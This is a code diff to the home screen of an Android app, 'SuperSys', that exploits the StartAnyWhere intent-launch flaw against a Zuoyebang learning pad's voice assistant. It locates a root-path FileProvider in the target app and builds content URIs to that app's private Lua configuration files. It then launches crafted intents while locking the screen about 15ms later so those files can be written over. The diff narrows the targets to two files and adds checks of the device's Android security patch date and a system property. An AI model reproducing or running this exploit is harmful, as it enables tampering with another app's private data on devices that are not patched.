@@ -16,8 +16,8 @@ import android.widget.ImageView
 import net.steamcrafted.materialiconlib.MaterialDrawableBuilder
 import android.widget.TextView
 import android.widget.Toast
-import androidx.appcompat.app.AlertDialog
 import androidx.fragment.app.Fragment
+import com.google.android.material.dialog.MaterialAlertDialogBuilder
 import org.xmlpull.v1.XmlPullParser
 import com.cfks.startanywhere.StartAnyWhere
 import com.cfks.supersys.MainActivity
@@ -35,29 +35,13 @@ class HomeFragment : Fragment() {
         private const val TARGET_PACKAGE = "com.zuoyebang.iot.pad.zpvoiceassistant"
         private const val TARGET_ACTIVITY = "com.zuoyebang.iot.pad.zpvoiceassistant.UnlockScreenBridgeActivity"
         private const val FILE_PROVIDER_PATHS_KEY = "android.support.FILE_PROVIDER_PATHS"
-        const val KEY_TARGET_FILE_PATH = "target_file_path"
 
-        val TARGET_FILE_PATHS = listOf(
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/nlucfg.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/lexcfg.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/lua/postfunc.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/lua/reformcb.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/lua/reformcb.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/lua/postfunc.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/nlucfg.lua",
-            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/lexcfg.lua"
-        )
+        private const val TARGET_FILE_PATH_1 =
+            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/tasks/nlucfg.lua"
+        private const val TARGET_FILE_PATH_2 =
+            "/data/user/0/com.zuoyebang.iot.pad.zpvoiceassistant/files/dds/custom/res/nlu/res/2024091000000013/66dfe05f8ea296000161c16f/nlucfg.lua"
 
-        val TARGET_FILE_LABELS = listOf(
-            "tasks/nlucfg.lua",
-            "tasks/lexcfg.lua",
-            "tasks/lua/postfunc.lua",
-            "tasks/lua/reformcb.lua",
-            "66dfe.../lua/reformcb.lua",
-            "66dfe.../lua/postfunc.lua",
-            "66dfe.../nlucfg.lua",
-            "66dfe.../lexcfg.lua"
-        )
+        val TARGET_FILE_PATHS = listOf(TARGET_FILE_PATH_1, TARGET_FILE_PATH_2)
 
         @Volatile
         var pendingExploit = false
@@ -81,7 +65,6 @@ class HomeFragment : Fragment() {
         super.onViewCreated(view, savedInstanceState)
         setupStatusCard()
         setupInstallButton()
-        setupTargetFileButton()
         setupRevokeButton()
         setupDeviceInfo()
     }
@@ -107,22 +90,37 @@ class HomeFragment : Fragment() {
     private fun checkInstallStatus() {
         val ctx = requireContext()
         val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
-        val storedUri = prefs.getString(KEY_STORED_URI, null)
+        val storedUris = getStoredUris(prefs)
 
-        if (storedUri == null) {
+        if (storedUris.isEmpty()) {
             updateInstallStatus(false)
             return
         }
 
         Thread {
-            val content = UriUtils.readUri(ctx, storedUri)
-            val installed = content != null && content.startsWith("-- SuperSys")
+            var allInstalled = true
+            for (uriStr in storedUris) {
+                val content = UriUtils.readUri(ctx, uriStr)
+                if (content == null || !content.startsWith("-- SuperSys")) {
+                    allInstalled = false
+                    break
+                }
+            }
             requireActivity().runOnUiThread {
                 if (_binding != null && isAdded) {
-                    updateInstallStatus(installed)
+                    updateInstallStatus(allInstalled)
                 }
             }
         }.start()
+    }
+
+    private fun getStoredUris(prefs: android.content.SharedPreferences): List<String> {
+        val uris = mutableListOf<String>()
+        for (i in TARGET_FILE_PATHS.indices) {
+            val uri = prefs.getString("${KEY_STORED_URI}_$i", null)
+            if (uri != null) uris.add(uri)
+        }
+        return uris
     }
 
     private fun updateInstallStatus(installed: Boolean) {
@@ -156,64 +154,31 @@ class HomeFragment : Fragment() {
         }
     }
 
-    private fun getTargetFilePath(): String {
-        val ctx = requireContext()
-        val prefs = ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
-        return prefs.getString(KEY_TARGET_FILE_PATH, TARGET_FILE_PATHS[0]) ?: TARGET_FILE_PATHS[0]
-    }
-
-    private fun setupTargetFileButton() {
-        updateTargetFileDisplay()
-        binding.cardTargetFile.setOnClickListener {
-            showTargetFileDialog()
-        }
-        binding.btnTargetFile.setOnClickListener {
-            showTargetFileDialog()
-        }
-    }
-
-    private fun updateTargetFileDisplay() {
-        val currentPath = getTargetFilePath()
-        val index = TARGET_FILE_PATHS.indexOf(currentPath)
-        val label = if (index >= 0) TARGET_FILE_LABELS[index] else currentPath
-        binding.tvTargetFileValue.text = label
-    }
-
-    private fun showTargetFileDialog() {
-        val ctx = requireContext()
-        val currentPath = getTargetFilePath()
-        val currentIndex = TARGET_FILE_PATHS.indexOf(currentPath).coerceAtLeast(0)
-
-        val labels = TARGET_FILE_LABELS.toTypedArray()
-
-        AlertDialog.Builder(ctx)
-            .setTitle("选择目标文件")
-            .setSingleChoiceItems(labels, currentIndex) { dialog, which ->
-                val selectedPath = TARGET_FILE_PATHS[which]
-                ctx.getSharedPreferences(PREFS_NAME, android.content.Context.MODE_PRIVATE)
-                    .edit()
-                    .putString(KEY_TARGET_FILE_PATH, selectedPath)
-                    .apply()
-                updateTargetFileDisplay()
-                dialog.dismiss()
-                Toast.makeText(ctx, "已切换到: ${TARGET_FILE_LABELS[which]}", Toast.LENGTH_SHORT).show()
-            }
-            .setNegativeButton("取消", null)
-            .show()
-    }
-
     // region Install Logic
 
     private fun performInstallCheck() {
         val ctx = requireContext()
 
-        // Step 1: Check if target package has UnlockScreenBridgeActivity
+        // Step 1: Check StartAnyWhere support
+        if (!canStartAnyWhere()) {
+            showUnsupportedDialog("不支持的设备:StartAnyWhere不可用\n需要Android 11-13且安全补丁日期早于2023-03-01")
+            return
+        }
+
+        // Step 2: Check persist.sys.audio_type
+        val audioType = getSystemProperty("persist.sys.audio_type", "")
+        if (audioType != "aispeech") {
+            showUnsupportedDialog("不支持的设备:需要persist.sys.audio_type为aispeech,当前[$audioType]")
+            return
+        }
+
+        // Step 3: Check if target package has UnlockScreenBridgeActivity
         if (!isActivityExists(ctx, TARGET_PACKAGE, TARGET_ACTIVITY)) {
             showUnsupportedDialog("不支持的设备:缺失UnlockScreenBridgeActivity")
             return
         }
 
-        // Step 2: Find a FileProvider with root-path in the target package
+        // Step 4: Find a FileProvider with root-path in the target package
         val rootPathInfo = findRootPathFileProvider(ctx, TARGET_PACKAGE)
         if (rootPathInfo == null) {
             showUnsupportedDialog("不支持的设备:缺失root-path FileProvider")
@@ -223,13 +188,13 @@ class HomeFragment : Fragment() {
         val authority = rootPathInfo.first
         val rootName = rootPathInfo.second
 
-        // Step 3: Check accessibility permission (auto-request if needed)
+        // Step 5: Check accessibility permission (auto-request if needed)
         if (!isAccessibilityEnabled(ctx)) {
             pendingExploit = true
             pendingAuthority = authority
             pendingRootName = rootName
 
-            AlertDialog.Builder(ctx)
+            MaterialAlertDialogBuilder(ctx)
                 .setTitle("需要无障碍权限")
                 .setMessage("SuperSys 需要无障碍权限来执行熄屏操作。\n请在设置中启用 SuperSys 的无障碍服务，返回后将自动继续。")
                 .setPositiveButton("去设置") { _, _ ->
@@ -247,24 +212,23 @@ class HomeFragment : Fragment() {
             return
         }
 
-        // Step 4: Lock screen then execute exploit
+        // Step 6: Lock screen then execute exploit
         executeExploit(authority, rootName)
     }
 
     private fun executeExploit(authority: String, rootName: String) {
         val ctx = requireContext()
-        val targetFilePath = getTargetFilePath()
 
-        // Construct the content URI: content://{authority}/{rootName}{filePath}
-        val uriStr = if (rootName.isNotEmpty()) {
-            "content://$authority/$rootName$targetFilePath"
-        } else {
-            "content://$authority$targetFilePath"
+        // Launch exploit for both target files
+        for (targetFilePath in TARGET_FILE_PATHS) {
+            val uriStr = if (rootName.isNotEmpty()) {
+                "content://$authority/$rootName$targetFilePath"
+            } else {
+                "content://$authority$targetFilePath"
+            }
+            val hackedIntent = getHackedIntent(uriStr)
+            StartAnyWhere.pullSpecialActivity(ctx, hackedIntent)
         }
-
-        // Fire StartAnyWhere exploit first
-        val hackedIntent = getHackedIntent(uriStr)
-        StartAnyWhere.pullSpecialActivity(ctx, hackedIntent)
 
         // Lock screen ~15ms later (concurrent but slightly delayed)
         Handler(Looper.getMainLooper()).postDelayed({
@@ -383,6 +347,16 @@ class HomeFragment : Fragment() {
         return list?.contains(serviceName) == true
     }
 
+    private fun getSystemProperty(key: String, default: String): String {
+        return try {
+            val cls = Class.forName("android.os.SystemProperties")
+            val method = cls.getMethod("get", String::class.java, String::class.java)
+            method.invoke(null, key, default) as String
+        } catch (e: Exception) {
+            default
+        }
+    }
+
     // endregion
 
     // region Device Info
@@ -448,7 +422,7 @@ class HomeFragment : Fragment() {
     // endregion
 
     private fun showUnsupportedDialog(message: String) {
-        AlertDialog.Builder(requireContext())
+        MaterialAlertDialogBuilder(requireContext())
             .setTitle("不支持")
             .setMessage(message)
             .setPositiveButton("确定", null)
